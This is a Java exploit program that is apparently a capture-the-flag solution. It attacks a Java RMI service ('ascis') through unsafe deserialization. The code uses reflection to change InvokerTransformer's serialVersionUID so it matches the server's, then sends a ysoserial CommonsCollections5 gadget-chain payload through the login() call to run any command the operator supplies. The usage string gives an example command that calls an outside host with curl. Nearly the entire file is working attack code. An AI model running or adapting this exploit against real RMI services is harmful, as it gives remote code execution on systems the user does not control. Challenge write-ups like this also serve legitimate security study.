package rmi;

import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.rmi.NotBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import ysoserial.payloads.CommonsCollections5;

public class ASCISPlayer
{
    public static void main(String[] args) throws java.rmi.RemoteException, NotBoundException, Exception
    {
        if (args.length != 3) {
            System.out.println("Usage: java -jar ascis_rmi_v1_sol.jar localhost 1099 \"curl tsug0d.com:4321/?a=1\"");
            System.exit(0);
        }
        String rhost = args[0];
        Integer rport = Integer.parseInt(args[1]);
        String cmd = args[2];

        // On some project doesn't need this (?), maybe related to mac jdk security
        System.setProperty("java.security.policy", "./file.policy");
        System.setSecurityManager(new SecurityManager());

        // Connect to service
        Registry registry = LocateRegistry.getRegistry(rhost, rport);
        rmi.ASCISInterf ascisInterf = (rmi.ASCISInterf)registry.lookup("ascis");

        // by Using GadgetProbe, we found that org.apache.commons.collections.functors.InvokerTransformer unserialized and sent to DNS server
        // challenge require stream serialVersionUID (client) = local serialVersionUID (server), so we need to set it.
        // local class need serialVersionUID = -1333713373713373737, access directly to InvokerTransformer class and change its serialVersionUID
        Field serialVersionUID = InvokerTransformer.class.getDeclaredField("serialVersionUID");
        serialVersionUID.setAccessible(true);
        Field modifiers = Field.class.getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(serialVersionUID, serialVersionUID.getModifiers() & ~Modifier.FINAL);
        serialVersionUID.set(InvokerTransformer.class, -1333713373713373737L);

        // ysoserial magik
        try {
            // org.apache.commons.collections.functors.InvokerTransformer is inside CommonsCollections5
            Object payload = new CommonsCollections5().getObject(cmd);
            ascisInterf.login(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

